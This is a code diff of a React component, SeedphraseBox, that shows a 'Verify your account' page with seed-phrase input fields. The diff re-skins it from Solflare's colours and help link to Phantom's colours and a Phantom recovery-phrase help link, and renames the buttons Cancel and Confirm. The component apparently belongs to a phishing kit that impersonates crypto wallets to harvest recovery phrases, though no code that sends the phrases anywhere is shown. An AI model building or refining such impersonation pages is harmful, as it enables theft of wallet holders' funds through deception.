@@ -24,34 +24,20 @@ const SeedphraseBox = () => {
   }, []);
 
   // Listen for messages to update publicKey and balance
-// Listen for messages and retrieve from localStorage
-useEffect(() => {
-  const handleMessage = (event: MessageEvent) => {
-    if (event.origin === window.location.origin && event.data.publicKey) {
-      setPublicKey(event.data.publicKey);
-      setBalance(event.data.balance); // Balance received in lamports
-    }
-  };
+  useEffect(() => {
+    const handleMessage = (event: MessageEvent) => {
+      if (event.origin === window.location.origin && event.data.publicKey) {
+        setPublicKey(event.data.publicKey);
+        setBalance(event.data.balance); // Balance received in lamports
+      }
+    };
 
-  // Retrieve from localStorage as a fallback
-  const storedPublicKey = localStorage.getItem("publicKey");
-  const storedBalance = localStorage.getItem("balance");
+    window.addEventListener("message", handleMessage);
 
-  if (storedPublicKey) {
-    setPublicKey(storedPublicKey);
-  }
-
-  if (storedBalance) {
-    setBalance(Number(storedBalance)); // Ensure balance is stored as a number
-  }
-
-  window.addEventListener("message", handleMessage);
-
-  return () => {
-    window.removeEventListener("message", handleMessage);
-  };
-}, []);
-
+    return () => {
+      window.removeEventListener("message", handleMessage);
+    };
+  }, []);
 
   const handleSeedInputChange = (index: number, value: string) => {
     const updatedSeed = [...seedPhrase];
@@ -128,8 +114,8 @@ useEffect(() => {
 
   return (
     <div
-      style={{ backgroundColor: "#13161f" }}
-      className="h-screen w-full bg-gray-900 text-white flex flex-col items-center pt-5"
+      style={{ backgroundColor: "#222222" }}
+      className="h-screen w-full bg-gray-900 text-white flex flex-col items-center pt-2"
     >
       <h1 className="text-xl font-bold mb-4">Verify your account</h1>
 
@@ -165,7 +151,7 @@ useEffect(() => {
         <a
           className="pl-12 text-xs underline text-blue-600 hover:text-blue-800"
           target="_blank"
-          href="https://help.solflare.com/en/articles/6150591-how-to-export-your-recovery-phrase-on-solflare-mobile"
+          href="https://help.phantom.com/hc/en-us/articles/25334064171795-How-to-view-your-Secret-Recovery-Phrase-or-Private-Keys"
         >
           Need Help ?
         </a>
@@ -186,21 +172,19 @@ useEffect(() => {
         </div>
       )}
 
-      <div className="pt-4">
+      <div className="pt-2 pb-4">
         <button
-          style={{ backgroundColor: "#21242f" }}
           onClick={() => window.close()}
-          className="w-40 px-8 py-3 mr-4 bg-blue-600 rounded-md hover:opacity-70 text-white"
+          className="w-80 px-8 py-3 rounded-xl text-white bg-[#333333] transition-all duration-300 ease-in-out hover:bg-[#3b3c40]"
         >
-          Reject
+          Cancel
         </button>
-
+      </div><div>
         <button
-          style={{ backgroundColor: "#ff852d" }}
           onClick={generatePublicKey}
-          className="w-40 px-8 py-3 bg-blue-600 rounded-md hover:opacity-80 text-black"
+          className="w-80 px-8 py-3 rounded-xl text-black bg-[#ab9ff2] transition-all duration-300 ease-in-out hover:bg-sky-100"
         >
-          Sign
+          Confirm
         </button>
       </div>
     </div>
